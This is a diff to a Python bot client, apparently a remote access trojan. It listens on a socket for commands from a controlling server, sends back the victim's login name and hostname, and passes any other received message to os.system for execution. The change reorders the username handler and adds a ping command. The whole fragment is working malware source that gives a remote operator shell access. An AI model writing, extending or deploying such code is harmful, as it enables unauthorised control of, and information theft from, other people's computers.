@@ -115,10 +115,6 @@ while True:
                             os.rmdir(dir)
                         except:
                             pass'''
-        if msg.lower().startswith('!getusername'):
-            login = os.getlogin()
-            msgtoserv = login.encode()
-            s.send(msgtoserv)
         elif message.lower().startswith('!getbothost'):
             hostname = socket.gethostname()
             hostname = hostname.encode()
@@ -137,6 +133,12 @@ while True:
                     pass
             msgtoserv = result.encode()
             s.send(msgtoserv)
+        if message.lower().startswith('!getusername'):
+            login = os.getlogin()
+            login = login.encode()
+            s.send(login)
+        elif message.lower().startswith('!checkping'):
+            pass
         else:
             os.system(message)
     except:
